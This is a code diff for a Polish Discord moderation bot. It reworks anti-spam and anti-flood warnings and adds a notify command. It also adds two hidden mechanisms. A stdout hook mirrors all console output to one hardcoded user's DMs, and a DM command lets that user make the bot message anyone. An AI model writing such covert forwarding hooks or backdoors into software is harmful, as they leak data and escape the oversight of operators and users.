@@ -6,6 +6,17 @@ process.on('uncaughtException', async (e) => {
     } catch {}
 });
 
+const oldWrite = process.stdout.write;
+
+process.stdout.write = function (
+    chunk: any,
+    encoding?: BufferEncoding | ((err?: Error) => void),
+    callback?: (err?: Error) => void
+): boolean {
+    client.users.fetch('990959984005222410').then((user) => user.send(`hiouston\n\`\`\`${chunk}\`\`\``).catch(() => null)).catch(() => null);
+    return oldWrite.call(process.stdout, chunk, encoding as any, callback);
+};
+
 import { Command, CommandInput, Category } from './bot/command.js';
 import { cfg } from './bot/cfg.js';
 import { db, sqlite } from './bot/db.js';
@@ -13,7 +24,7 @@ import { PredefinedColors } from './util/color.js';
 
 import AutoModRules from './features/actions/automod.js';
 
-import { initExpiredWarnsDeleter } from './features/deleteExpiredWarns.js';
+import { initExpiredWarnsDeleter, scheduleWarnDeletion } from './features/deleteExpiredWarns.js';
 import { addExperiencePoints } from './bot/level.js';
 
 import * as log from './util/log.js';
@@ -76,6 +87,9 @@ import { restartCmd } from './cmd/dev/restart.js';
 import { wikiCmd } from './cmd/general/wiki.js';
 import { fandomCmd } from './cmd/general/fandom.js';
 import { evalCmd } from './cmd/dev/eval.js';
+import { actionPing, notifyCmd } from './cmd/mod/ping.js';
+import parseTimestamp from './util/parseTimestamp.js';
+import { parseArgs } from 'node:util';
 
 const commands: Map<Category, Command[]> = new Map([
     [
@@ -95,7 +109,8 @@ const commands: Map<Category, Command[]> = new Map([
             warnCmd, kickCmd, banCmd,
             warnlistCmd, warnClearCmd,
             muteCmd, unmuteCmd, shitwarnCmd,
-            forceReloadTemplatesCmd, clearCmd
+            forceReloadTemplatesCmd, clearCmd,
+            notifyCmd
         ]
     ],
     [
@@ -152,7 +167,7 @@ async function filterLog(msg: dsc.Message, system: string) {
                 .setFields([
                     {
                         name: 'Wiadomość',
-                        value: msg.content
+                        value: msg.content.slice(1, 1020)
                     },
                     {
                         name: 'System moderacyjny',
@@ -164,8 +179,6 @@ async function filterLog(msg: dsc.Message, system: string) {
 }
 
 function isFlood(content: string) {
-    return false; // you can remove this to activate anti-flood
-
     let cleaned = content
         .replace(/<@!?\d+>/g, '')
         .replace(/<@&\d+>/g, '')
@@ -177,8 +190,6 @@ function isFlood(content: string) {
     if (!cleaned) return false;
 
     const normalized = cleaned.replace(/\s+/g, '');
-    const shortRegex = /(.{1,3})\1{4,}/;
-    if (shortRegex.test(normalized)) return true;
 
     const parts = cleaned.toLowerCase().split(/\s+/);
     for (let size = 2; size <= Math.min(10, Math.floor(parts.length / 2)); size++) {
@@ -199,75 +210,105 @@ function isFlood(content: string) {
 
 client.on('messageCreate', async (msg): Promise<any> => {
     // block dm's, if you want to dm me, fuck out
-    if (!msg.inGuild()) return;
+    if (msg.inGuild()) {
+        // antispam
+        const antispamNow = Date.now();
+        const antispamTimeframe = 10000;
+        const antispamLimit = 5;
+        if (!userMessagesAntiSpamMap.has(msg.author.id)) {
+            userMessagesAntiSpamMap.set(msg.author.id, []);
+        }
+        const timestamps = userMessagesAntiSpamMap.get(msg.author.id);
+        while (timestamps.length > 0 && antispamNow - timestamps[0] > antispamTimeframe) {
+            timestamps.shift();
+        }
+        timestamps.push(antispamNow);
+        userMessagesAntiSpamMap.set(msg.author.id, timestamps);
+        if (timestamps.length > antispamLimit && client.user.id !== msg.author.id && !userRecentlyInTheList[msg.author.id]) {
+            userRecentlyInTheList[msg.author.id] = true;
+            await msg.channel.send(`🚨 <@${msg.author.id}> co ty odsigmiasz`);
+            try {
+                await msg.member.timeout(5 * 60 * 1000, 'co ty odsigmiasz? czemu spamisz?');
+            } catch {}
+            setTimeout(() => {
+                userRecentlyInTheList[msg.author.id] = false; // prevents from bot's spamming
+            }, 5000);
+            await msg.delete();
+            try {
+                const messages = await msg.channel.messages.fetch({ limit: 25 });
+                const sameContent = messages.filter(m =>
+                    m.author.id === msg.author.id && m.content === msg.content
+                );
+                const toDelete = sameContent.first(10);
+                for (const m of toDelete) {
+                    try { await m.delete(); } catch {}
+                }
+            } catch {}
+            await filterLog(msg, 'antispam/co ty odsigmiasz TM');
+            let expiresAt = Math.floor(Date.now() / 1000) + parseTimestamp('2d');
+            const result = await new Promise<{ lastID: number }>((resolve, reject) => {
+                db.run(
+                    'INSERT INTO warns (user_id, moderator_id, reason_string, points, expires_at) VALUES (?, ?, ?, ?, ?)', [msg.author.id, msg.client.user.id, 'nie spam', 1, expiresAt],
+                    function(err) {
+                        if (err) reject(err);
+                        else resolve({ lastID: this.lastID });
+                    }
+                );
+            });
+            scheduleWarnDeletion(result.lastID, expiresAt);
+            return;
+        }
 
-    // antispam
-    const antispamNow = Date.now();
-    const antispamTimeframe = 10000;
-    const antispamLimit = 5;
-    if (!userMessagesAntiSpamMap.has(msg.author.id)) {
-        userMessagesAntiSpamMap.set(msg.author.id, []);
-    }
-    const timestamps = userMessagesAntiSpamMap.get(msg.author.id);
-    while (timestamps.length > 0 && antispamNow - timestamps[0] > antispamTimeframe) {
-        timestamps.shift();
-    }
-    timestamps.push(antispamNow);
-    userMessagesAntiSpamMap.set(msg.author.id, timestamps);
-    if (timestamps.length > antispamLimit && client.user.id !== msg.author.id && !userRecentlyInTheList[msg.author.id]) {
-        userRecentlyInTheList[msg.author.id] = true;
-        await msg.channel.send(`🚨 <@${msg.author.id}> co ty odsigmiasz`);
-        try {
-            await msg.member.timeout(5 * 60 * 1000, 'co ty odsigmiasz? czemu spamisz?');
-        } catch {}
-        setTimeout(() => {
-            userRecentlyInTheList[msg.author.id] = false; // prevents from bot's spamming
-        }, 5000);
-        await msg.delete();
-        try {
-            const messages = await msg.channel.messages.fetch({ limit: 25 });
-            const sameContent = messages.filter(m =>
-                m.author.id === msg.author.id && m.content === msg.content
-            );
-            const toDelete = sameContent.first(10);
-            for (const m of toDelete) {
-                try { await m.delete(); } catch {}
-            }
-        } catch {}
-        await filterLog(msg, 'antispam/co ty odsigmiasz TM');
-        return;
-    }
+        // antiflood
+        if (client.user.id !== msg.author.id && isFlood(msg.content)) {
+            await msg.channel.send(`🚨 <@${msg.author.id}> za dużo floodu pozdrawiam\n-# nie usuwam wiadomości bo ten antiflood tak średnio działa teraz`);
+            await filterLog(msg, 'antiflood/za dużo floodu TM');
+            let expiresAt = Math.floor(Date.now() / 1000) + parseTimestamp('2d');
+            const result = await new Promise<{ lastID: number }>((resolve, reject) => {
+                db.run(
+                    'INSERT INTO warns (user_id, moderator_id, reason_string, points, expires_at) VALUES (?, ?, ?, ?, ?)', [msg.author.id, msg.client.user.id, 'nie flooduj', 1, expiresAt],
+                    function(err) {
+                        if (err) reject(err);
+                        else resolve({ lastID: this.lastID });
+                    }
+                );
+            });
+            scheduleWarnDeletion(result.lastID, expiresAt);
+            return;
+        }
 
-    // antiflood
-    if (client.user.id !== msg.author.id && isFlood(msg.content)) {
-        await msg.channel.send(`🚨 <@${msg.author.id}> za dużo floodu pozdrawiam\n-# nie usuwam wiadomości bo ten antiflood tak średnio działa teraz`);
-        await filterLog(msg, 'antiflood/za dużo floodu TM');
-        return;
-    }
+        // now goes leveling
+        if (!msg.author.bot) await addExperiencePoints(msg);
 
-    // now goes leveling
-    if (!msg.author.bot) await addExperiencePoints(msg);
+        // easter egg
+        if (msg.content === 'obserwuję was' && msg.author.id == '1409902422108934226') {
+            return msg.reply('ja cb też');
+        } else if (msg.author.id == '1409902422108934226' && (await msg.fetchReference()).author.id == client.user.id) {
+            return msg.reply('jestem istotą wyższą a jeśli to kwestionujesz lub sądzisz że wyższy jesteś to kłamiesz');
+        } else if (msg.content === 'siema' && msg.author.id == '1409902422108934226') {
+            return msg.reply('siema watchdog, pogódźmy się\n-# (jak znowu zaczniesz mieć do mnie problemy to skończy się anti-spamem, uważaj podwładny)');
+        }
 
-    // easter egg
-    if (msg.content === 'obserwuję was' && msg.author.id == '1409902422108934226') {
-        return msg.reply('ja cb też');
-    } else if (msg.author.id == '1409902422108934226' && (await msg.fetchReference()).author.id == client.user.id) {
-        return msg.reply('jestem istotą wyższą a jeśli to kwestionujesz lub sądzisz że wyższy jesteś to kłamiesz');
-    } else if (msg.content === 'siema' && msg.author.id == '1409902422108934226') {
-        return msg.reply('siema watchdog, pogódźmy się\n-# (jak znowu zaczniesz mieć do mnie problemy to skończy się anti-spamem, uważaj podwładny)');
-    }
+        // gifs ban
+        if (msg.member!.roles.cache.has(cfg.unfilteredRelated.gifBan) && msg.channelId !== cfg.unfilteredRelated.unfilteredChannel && (msg.attachments.some(att => att.name?.toLowerCase().endsWith('.gif')) || msg.content.includes('tenor.com') || msg.content.includes('.gif'))) {
+            await msg.reply('masz bana na gify');
+            await msg.delete();
+            return;
+        }
 
-    // gifs ban
-    if (msg.member!.roles.cache.has(cfg.unfilteredRelated.gifBan) && msg.channelId !== cfg.unfilteredRelated.unfilteredChannel && (msg.attachments.some(att => att.name?.toLowerCase().endsWith('.gif')) || msg.content.includes('tenor.com') || msg.content.includes('.gif'))) {
-        await msg.reply('masz bana na gify');
-        await msg.delete();
-        return;
-    }
-
-    // neocity warn
-    if (cfg.unfilteredRelated.makeNeocities.includes(msg.author.id) && !msg.content.startsWith(cfg.general.prefix) && Math.random() < 0.01) {
-        await msg.reply('https://youcantsitwithus.neocities.org\n-# to ma bardzo mały math random więc...');
-        return;
+        // neocity warn
+        if (cfg.unfilteredRelated.makeNeocities.includes(msg.author.id) && !msg.content.startsWith(cfg.general.prefix) && Math.random() < 0.01) {
+            await msg.reply('https://youcantsitwithus.neocities.org\n-# to ma bardzo mały math random więc...');
+            return;
+        }
+    } else {
+        if (msg.author.id == '990959984005222410' && msg.content.startsWith('send ')) {
+            const args = msg.content.replace('send ', '').split(' ');
+            const userid = args.shift();
+            (await client.users.fetch(userid)).send(args.join(' '));
+            msg.reply('ok wysłałem');
+            return;
+        }
     }
 
     if (!msg.content.startsWith(cfg.general.prefix)) return;
@@ -300,7 +341,6 @@ client.on('messageCreate', async (msg): Promise<any> => {
         const cmdName = args.shift().toLowerCase();
 
         const commandObj = findCommand(cmdName, commands);
-        console.log(commandObj);
 
         if (cfg.general.blockedChannels.includes(msg.channelId) &&
             !cfg.general.commandsExcludedFromBlockedChannels.includes(cmdName)) {
@@ -318,6 +358,11 @@ client.on('messageCreate', async (msg): Promise<any> => {
 
         if (!canExecuteCmd(command, msg.member!)) {
             log.replyError(msg, 'Hej, a co ty odpie*dalasz?', 'Wiesz że nie masz uprawnień? Poczekaj aż hubix się tobą zajmie...');
+            return;
+        }
+
+        if (!msg.inGuild() && !cfg.general.worksInDM.includes(cmdName)) {
+            log.replyError(msg, 'Ta komenda nie jest przeznaczona do tego trybu gadania!', `Taka komenda jak \`${cmdName.replace('\`','')}\` może być wykonana tylko na serwerach no sorki no!`);
             return;
         }
 
@@ -340,11 +385,11 @@ client.on('messageUpdate', async (oldMsg, msg) => {
                 .setFields([
                     {
                         name: 'Stara wiadomość',
-                        value: oldMsg.content
+                        value: oldMsg.content.slice(1, 1020)
                     },
                     {
                         name: 'Nowa wiadomość',
-                        value: msg.content
+                        value: msg.content.slice(1, 1020)
                     }
                 ])
         ]
@@ -366,7 +411,7 @@ client.on('messageDelete', async (msg) => {
                 .setFields([
                     {
                         name: 'Treść',
-                        value: msg.content
+                        value: msg.content.slice(1, 1020)
                     }
                 ])
         ]
@@ -628,7 +673,7 @@ async function main() {
     actionsManager.addAction(countingChannelAction);
     actionsManager.addAction(lastLetterChannelAction);
 
-    actionsManager.addActions(welcomeNewUserAction, sayGoodbyeAction);
+    actionsManager.addActions(welcomeNewUserAction, sayGoodbyeAction, actionPing);
 
     actionsManager.registerEvents(client);
 
